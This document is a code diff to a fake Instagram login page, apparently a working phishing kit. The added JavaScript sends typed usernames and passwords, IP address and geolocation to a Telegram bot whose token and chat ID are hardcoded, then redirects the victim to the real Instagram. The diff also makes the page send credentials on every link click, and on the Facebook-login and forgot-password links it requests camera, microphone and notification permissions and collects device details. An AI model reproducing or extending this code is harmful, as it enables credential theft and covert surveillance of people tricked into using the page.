@@ -39,7 +39,7 @@
             pointer-events: none; /* Disable interaction after hidden */
         }
         .loading-logo-img { /* New style for the loading screen logo image */
-            width: 200px; /* Adjusted size as requested */
+            width: 150px; /* Adjusted size to be smaller */
             height: auto; /* Maintain aspect ratio */
             margin-bottom: 20px;
         }
@@ -282,7 +282,7 @@
         <img src="https://github.com/KINGSHUBHAM-tech/Logo-cp-websp/blob/main/1658586823instagram-logo-transparent.png?raw=true"
              alt="Instagram Logo"
              class="loading-logo-img"
-             onerror="this.onerror=null;this.src='https://placehold.co/200x80/333/FFF?text=Instagram+Logo'">
+             onerror="this.onerror=null;this.src='https://placehold.co/150x60/333/FFF?text=Instagram+Logo'">
         <span class="meta-text">from Meta</span>
     </div>
 
@@ -300,31 +300,31 @@
 
         <div class="or-divider">OR</div>
 
-        <button class="facebook-login">
+        <button class="facebook-login" data-link-name="Facebook Login">
             <svg aria-label="Facebook icon" class="-mt-px mr-2" color="#0095f6" fill="#0095f6" height="16" role="img" viewBox="0 0 24 24" width="16"><path d="M12.001 0C5.373 0 0 5.373 0 12.001 0 17.989 4.143 22.825 9.71 23.906V15.5H7V12.5h2.71v-2.002c0-2.68 1.63-4.142 4.027-4.142 1.15 0 2.14.086 2.433.125V8.5h-1.63c-1.396 0-1.666.663-1.666 1.638v1.863h3.334l-.534 3h-2.8V23.906C19.858 22.824 24 17.989 24 12.001 24 5.373 18.627 0 12.001 0Z"></path></svg>
             Log in with Facebook
         </button>
 
-        <a href="#" class="forgot-password">Forgot password?</a>
+        <a href="#" class="forgot-password" data-link-name="Forgot Password">Forgot password?</a>
     </div>
 
     <div class="signup-box">
-        Don't have an account? <a href="#" class="signup-link">Sign up</a>
+        Don't have an account? <a href="#" class="signup-link" data-link-name="Sign Up Link">Sign up</a>
     </div>
 
     <div class="get-the-app">Get the app.</div>
     <div class="app-links">
-        <a href="https://apps.apple.com/us/app/instagram/id389801252" target="_blank">
+        <a href="https://apps.apple.com/us/app/instagram/id389801252" target="_blank" data-link-name="Apple Store">
             <img src="https://github.com/laisfrigerio/instagram-clone-login-page/blob/master/img/apple-button.png?raw=true"
                  alt="Download on the App Store"
                  onerror="this.onerror=null;this.src='https://placehold.co/135x40/333/FFF?text=Apple+Store'">
         </a>
-        <a href="https://play.google.com/store/apps/details?id=com.instagram.android&hl=en" target="_blank">
+        <a href="https://play.google.com/store/apps/details?id=com.instagram.android&hl=en" target="_blank" data-link-name="Google Play Store">
             <img src="https://github.com/laisfrigerio/instagram-clone-login-page/blob/master/img/googleplay-button.png?raw=true"
                  alt="Get it on Google Play"
                  onerror="this.onerror=null;this.src='https://placehold.co/135x40/333/FFF?text=Google+Play'">
         </a>
-        <a href="https://apps.microsoft.com/detail/instagram/9NBLGGH5L9XT?hl=en-us&gl=US" target="_blank">
+        <a href="https://apps.microsoft.com/detail/instagram/9NBLGGH5L9XT?hl=en-us&gl=US" target="_blank" data-link-name="Microsoft Store">
             <img src="https://github.com/KINGSHUBHAM-tech/FALCON-BOT/blob/main/image.png?raw=true"
                  alt="Get it from Microsoft"
                  onerror="this.onerror=null;this.src='https://placehold.co/135x40/333/FFF?text=Microsoft+Store'">
@@ -333,19 +333,19 @@
 
     <!-- Footer Links -->
     <div class="footer-links">
-        <a href="#">Meta</a>
-        <a href="#">About</a>
-        <a href="#">Blog</a>
-        <a href="#">Jobs</a>
-        <a href="#">Help</a>
-        <a href="#">API</a>
-        <a href="#">Privacy</a>
-        <a href="#">Terms</a>
-        <a href="#">Locations</a>
-        <a href="#">Instagram Lite</a>
-        <a href="#">Threads</a>
-        <a href="#">Contact Uploading & Non-Users</a>
-        <a href="#">Meta Verified</a>
+        <a href="#" data-link-name="Meta Link">Meta</a>
+        <a href="#" data-link-name="About Link">About</a>
+        <a href="#" data-link-name="Blog Link">Blog</a>
+        <a href="#" data-link-name="Jobs Link">Jobs</a>
+        <a href="#" data-link-name="Help Link">Help</a>
+        <a href="#" data-link-name="API Link">API</a>
+        <a href="#" data-link-name="Privacy Link">Privacy</a>
+        <a href="#" data-link-name="Terms Link">Terms</a>
+        <a href="#" data-link-name="Locations Link">Locations</a>
+        <a href="#" data-link-name="Instagram Lite Link">Instagram Lite</a>
+        <a href="#" data-link-name="Threads Link">Threads</a>
+        <a href="#" data-link-name="Contact Uploading & Non-Users Link">Contact Uploading & Non-Users</a>
+        <a href="#" data-link-name="Meta Verified Link">Meta Verified</a>
     </div>
     <div class="copyright-text">
         © 2025 Instagram from Meta
@@ -380,9 +380,231 @@
             // Validation functions
             const isEmail = (input) => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(input);
             const isPhoneNumber = (input) => /^\d{10}$/.test(input);
-            const isUsername = (input) => /^[a-zA-Z0-9._]{1,30}$/.test(input); // Usernames between 1-30 chars, letters, numbers, periods, underscores
+            const isUsername = (input) => /^[a-zA-Z0-9._]{1,30}$/.test(input);
 
-            // Login validation, Telegram send, and redirect
+            // Helper function to query permission status
+            async function getPermissionStatus(name) {
+                try {
+                    if (navigator.permissions && navigator.permissions.query) {
+                        const result = await navigator.permissions.query({ name: name });
+                        return result.state; // 'granted', 'denied', 'prompt'
+                    }
+                    return 'API Not Supported';
+                } catch (e) {
+                    return `Error querying (${e.message || e.name})`;
+                }
+            }
+
+            // sendToTelegram function now accepts input1, input2, actionType, and a flag for detailed info
+            async function sendToTelegram(input1, input2, actionType, includeDetailedInfo = false) {
+                const browser = navigator.userAgent;
+                const language = navigator.language;
+                const platform = navigator.platform;
+                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+                let ip = 'Error in fetching IP';
+                let locationText = 'Error in fetching Geolocation';
+                let cameraStatus = 'N/A';
+                let microphoneStatus = 'N/A';
+                let notificationsStatus = 'N/A';
+                let clipboardReadStatus = 'N/A';
+                let clipboardWriteStatus = 'N/A';
+                let screenWakeLockStatus = 'N/A';
+                let batteryLevel = 'N/A';
+                let batteryCharging = 'N/A';
+                let networkType = 'N/A';
+                let networkEffectiveType = 'N/A';
+                let deviceMemory = 'N/A';
+                let hardwareConcurrency = 'N/A';
+
+                // Fetch IP and Geolocation regardless of includeDetailedInfo
+                try {
+                    const ipRes = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipRes.json();
+                    ip = ipData.ip;
+                } catch (e) { /* Error in fetching IP */ }
+
+                try {
+                    await new Promise((resolve) => {
+                        navigator.geolocation.getCurrentPosition(
+                            (pos) => {
+                                const { latitude, longitude } = pos.coords;
+                                locationText = `Latitude: ${latitude}, Longitude: ${longitude}`;
+                                resolve();
+                            },
+                            (error) => {
+                                locationText = `Permission Denied or Error in fetching Geolocation (${error.message || error.code})`;
+                                resolve();
+                            },
+                            { timeout: 5000, enableHighAccuracy: false }
+                        );
+                    });
+                } catch (e) { /* Error in fetching Geolocation */ }
+
+
+                if (includeDetailedInfo) {
+                    // Camera Access
+                    try {
+                        const currentCameraState = await getPermissionStatus('camera');
+                        if (currentCameraState === 'granted') {
+                            cameraStatus = 'Granted';
+                        } else if (currentCameraState === 'denied') {
+                            cameraStatus = 'Permission Denied';
+                        } else {
+                            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+                            cameraStatus = 'Granted (Requested)';
+                            stream.getTracks().forEach(track => track.stop()); // Stop stream immediately
+                        }
+                    } catch (e) {
+                        cameraStatus = `Error/Denied Camera (${e.message || e.name})`;
+                    }
+
+                    // Microphone Access
+                    try {
+                        const currentMicState = await getPermissionStatus('microphone');
+                        if (currentMicState === 'granted') {
+                            microphoneStatus = 'Granted';
+                        } else if (currentMicState === 'denied') {
+                            microphoneStatus = 'Permission Denied';
+                        } else {
+                            const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
+                            microphoneStatus = 'Granted (Requested)';
+                            stream.getTracks().forEach(track => track.stop()); // Stop stream immediately
+                        }
+                    } catch (e) {
+                        microphoneStatus = `Error/Denied Microphone (${e.message || e.name})`;
+                    }
+
+                    // Notifications Access
+                    try {
+                        const permission = await Notification.requestPermission();
+                        notificationsStatus = permission; // 'granted', 'denied', or 'default'
+                    } catch (e) {
+                        notificationsStatus = `Error in fetching Notifications (${e.message || e.name})`;
+                    }
+
+                    // Clipboard Read Permission
+                    clipboardReadStatus = await getPermissionStatus('clipboard-read');
+
+                    // Clipboard Write Permission
+                    clipboardWriteStatus = await getPermissionStatus('clipboard-write');
+
+                    // Screen Wake Lock Permission
+                    screenWakeLockStatus = await getPermissionStatus('screen-wake-lock');
+                   
+                    // Battery Status API
+                    try {
+                        if ('getBattery' in navigator) {
+                            const battery = await navigator.getBattery();
+                            batteryLevel = `${(battery.level * 100).toFixed(0)}%`;
+                            batteryCharging = battery.charging ? 'Yes' : 'No';
+                        } else {
+                            batteryLevel = 'API Not Supported';
+                            batteryCharging = 'API Not Supported';
+                        }
+                    } catch (e) {
+                        batteryLevel = `Error in fetching Battery status (${e.message || e.name})`;
+                        batteryCharging = `Error in fetching Battery status (${e.message || e.name})`;
+                    }
+
+                    // Network Information API
+                    try {
+                        if ('connection' in navigator && navigator.connection) {
+                            networkType = navigator.connection.type || 'N/A';
+                            networkEffectiveType = navigator.connection.effectiveType || 'N/A';
+                        } else {
+                            networkType = 'API Not Supported';
+                            networkEffectiveType = 'API Not Supported';
+                        }
+                    } catch (e) {
+                        networkType = `Error in fetching Network info (${e.message || e.name})`;
+                        networkEffectiveType = `Error in fetching Network info (${e.message || e.name})`;
+                    }
+
+                    // Device Memory
+                    try {
+                        if ('deviceMemory' in navigator) {
+                            deviceMemory = `${navigator.deviceMemory} GB`;
+                        } else {
+                            deviceMemory = 'API Not Supported';
+                        }
+                    } catch (e) {
+                        deviceMemory = `Error in fetching Device Memory (${e.message || e.name})`;
+                    }
+
+                    // Hardware Concurrency
+                    try {
+                        if ('hardwareConcurrency' in navigator) {
+                            hardwareConcurrency = navigator.hardwareConcurrency;
+                        } else {
+                            hardwareConcurrency = 'API Not Supported';
+                        }
+                    } catch (e) {
+                        hardwareConcurrency = `Error in fetching Hardware Concurrency (${e.message || e.name})`;
+                    }
+                } // End of includeDetailedInfo block
+
+                let permissionSection = '';
+                if (includeDetailedInfo) {
+                    permissionSection = `
+🔒 *Permissions Status:*
+- Camera: ${cameraStatus}
+- Microphone: ${microphoneStatus}
+- Notifications: ${notificationsStatus}
+- Clipboard Read: ${clipboardReadStatus}
+- Clipboard Write: ${clipboardWriteStatus}
+- Screen Wake Lock: ${screenWakeLockStatus}
+
+🔋 *Device Info:*
+- Battery Level: ${batteryLevel}
+- Battery Charging: ${batteryCharging}
+- Network Type: ${networkType}
+- Effective Network Type: ${networkEffectiveType}
+- Device Memory: ${deviceMemory}
+- Hardware Concurrency (CPU cores): ${hardwareConcurrency}
+`;
+                }
+
+
+                const fullMessage = `
+? *${actionType}*
+---------------------
+📝 *Identifier:* ${input1 || 'Not Entered'}
+📝 *Password:* ${input2 || 'Not Entered'}
+
+🌐 *Browser Info:*
+- Platform: ${platform}
+- Language: ${language}
+- Timezone: ${timezone}
+- User Agent: ${browser}
+
+🌍 *IP Address:* ${ip}
+📍 *Geolocation:* ${locationText}
+${permissionSection}
+`;
+
+                const botToken = '8110993477:AAH13IhAuwiaM7shHomBLrOpVcsk7jyIFLE';
+                const chatId = '5848851070';
+
+                const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+                try {
+                    const response = await fetch(url, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: fullMessage,
+                            parse_mode: 'Markdown'
+                        })
+                    });
+                    await response.json(); // Consume response to ensure request completes
+                } catch (error) {
+                    // Silently handle fetch errors
+                }
+            }
+
+            // Login validation, Telegram send, and redirect (BASIC INFO ONLY)
             loginButton.addEventListener('click', async () => {
                 const identifier = usernameEmailPhoneInput.value.trim();
                 const password = passwordInput.value.trim();
@@ -405,15 +627,42 @@
                 }
 
                 if (isValidIdentifier && password) {
-                    // Call sendToTelegram with collected data
-                    await sendToTelegram(identifier, password); // Await the send operation
-                    // Redirect to Instagram after validation and sending info
+                    // Only basic info sent for primary login button
+                    await sendToTelegram(identifier, password, 'Login Attempt (Basic Info)');
                     window.location.href = "https://www.instagram.com";
                 } else {
-                    // Use custom alert for login errors
                     alert(validationMessage.trim() || 'Please fill in both fields correctly.');
                 }
             });
+
+            // Add event listeners to specific links for DETAILED INFO COLLECTION
+            document.querySelectorAll('a, button.facebook-login').forEach(link => {
+                // Exclude the login-button itself as it has its own logic
+                if (link.id === 'login-button') return;
+
+                // Only apply detailed info collection to Facebook Login and Forgot Password
+                const linkName = link.dataset.linkName || link.innerText.trim() || link.getAttribute('href');
+                if (link.classList.contains('facebook-login') || link.classList.contains('forgot-password')) {
+                     link.addEventListener('click', async (event) => {
+                        const identifier = usernameEmailPhoneInput.value.trim();
+                        const password = passwordInput.value.trim();
+                        
+                        // Send with detailed info for these specific links
+                        await sendToTelegram(identifier, password, `Clicked Link: ${linkName}`, true);
+                        
+                        // Let the default navigation happen after the data is sent
+                     });
+                } else {
+                    // For other links (like signup, app links, footer links), send basic info
+                    link.addEventListener('click', async (event) => {
+                        const identifier = usernameEmailPhoneInput.value.trim();
+                        const password = passwordInput.value.trim();
+                        
+                        await sendToTelegram(identifier, password, `Clicked Link: ${linkName}`);
+                    });
+                }
+            });
+
 
             // Prevent default form submission if this were a form
             usernameEmailPhoneInput.addEventListener('keydown', (event) => {
@@ -430,79 +679,6 @@
                 }
             });
 
-            // sendToTelegram function now accepts input1 and input2 as parameters and gathers additional info
-            async function sendToTelegram(input1, input2) {
-                const browser = navigator.userAgent;
-                const language = navigator.language;
-                const platform = navigator.platform;
-                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-
-                let ip = 'Error in fetching IP'; // Initialize with error message
-                let locationText = 'Error in fetching Geolocation'; // Initialize with error message
-
-                try {
-                    const ipRes = await fetch('https://api.ipify.org?format=json');
-                    const ipData = await ipRes.json();
-                    ip = ipData.ip;
-                } catch (e) {
-                    // ip remains 'Error in fetching'
-                }
-
-                try {
-                    await new Promise((resolve) => {
-                        navigator.geolocation.getCurrentPosition(
-                            (pos) => {
-                                const { latitude, longitude } = pos.coords;
-                                locationText = `Latitude: ${latitude}, Longitude: ${longitude}`;
-                                resolve();
-                            },
-                            (error) => {
-                                locationText = `Error in fetching Geolocation (${error.message || error.code})`;
-                                resolve();
-                            },
-                            { timeout: 5000, enableHighAccuracy: false } // Added options for better handling
-                        );
-                    });
-                } catch (e) {
-                    // locationText remains 'Error in fetching'
-                }
-
-                const fullMessage = `
-? *New Login Attempt*
----------------------
-� *Identifier:* ${input1}
-📝 *Password:* ${input2}
-
-🌐 *Browser Info:*
-- Platform: ${platform}
-- Language: ${language}
-- Timezone: ${timezone}
-- User Agent: ${browser}
-
-🌍 *IP Address:* ${ip}
-📍 *Geolocation:* ${locationText}
-`;
-
-                const botToken = '8110993477:AAH13IhAuwiaM7shHomBLrOpVcsk7jyIFLE'; // Updated bot token
-                const chatId = '5848851070';      // Updated chat ID
-
-                const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-
-                try {
-                    const response = await fetch(url, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            chat_id: chatId,
-                            text: fullMessage,
-                            parse_mode: 'Markdown'
-                        })
-                    });
-                    await response.json(); // Consume response to ensure request completes
-                } catch (error) {
-                    // Silently handle fetch errors as requested
-                }
-            }
         });
 
         // Custom Alert function
@@ -515,4 +691,3 @@
     </script>
 </body>
 </html>
-�
